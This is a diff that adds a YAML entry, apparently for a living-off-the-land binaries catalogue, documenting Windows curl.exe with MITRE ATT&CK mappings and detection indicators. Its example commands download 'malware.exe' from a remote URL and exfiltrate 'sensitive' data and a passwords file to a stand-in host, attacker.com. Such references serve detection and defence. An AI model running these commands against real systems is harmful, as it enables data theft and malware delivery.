@@ -1,0 +1,41 @@
+---
+Name: curl.exe
+Description: Command-line tool for transferring data with URLs
+Author: LOLBins Project
+Created: 2026-01-16
+Commands:
+  - Command: curl.exe -o C:\temp\file.exe https://example.com/malware.exe
+    Description: Download a file from a remote URL and save it to disk
+    Usecase: Download arbitrary files from the internet for security testing
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10 1803+, Windows 11
+  - Command: curl.exe --upload-file C:\sensitive\data.txt https://attacker.com/upload
+    Description: Upload files to a remote server using HTTP PUT
+    Usecase: Exfiltrate data to an external server
+    Category: Upload
+    Privileges: User
+    MitreID: T1048.003
+    OperatingSystem: Windows 10 1803+, Windows 11
+  - Command: curl.exe -d @C:\passwords.txt https://attacker.com/collect
+    Description: Upload file contents via HTTP POST
+    Usecase: Exfiltrate data via HTTP POST request
+    Category: Upload
+    Privileges: User
+    MitreID: T1048.003
+    OperatingSystem: Windows 10 1803+, Windows 11
+Full_Path:
+  - Path: C:\Windows\System32\curl.exe
+Detection:
+  - IOC: curl.exe making outbound network connections
+  - IOC: curl.exe downloading executables
+  - IOC: curl.exe uploading files to external IPs
+  - Sigma: https://github.com/SigmaHQ/sigma/search?q=curl+download
+Resources:
+  - Link: https://curl.se/docs/manpage.html
+  - Link: https://docs.microsoft.com/en-us/windows/whats-new/whats-new-windows-10-version-1803
+Acknowledgement:
+  - Person: Microsoft
+  - Person: Daniel Stenberg
+    Handle: '@bagder'
